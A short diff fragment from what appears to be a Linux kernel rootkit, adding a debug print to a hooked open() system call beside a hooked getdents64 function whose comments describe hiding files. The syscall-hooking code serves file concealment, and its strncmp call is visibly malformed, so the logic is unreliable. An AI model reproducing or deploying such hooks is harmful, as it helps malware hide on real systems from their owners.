@@ -125,7 +125,7 @@ asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user 
 
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode){
     char *tmp;
-    
+    printk("hhh %s\n", filename);
     //Hide a new type of file
     if(strncmp(filename, INEXISTFILE, strlen(INEXISTFILE) == 0)){
         tmp = filename;
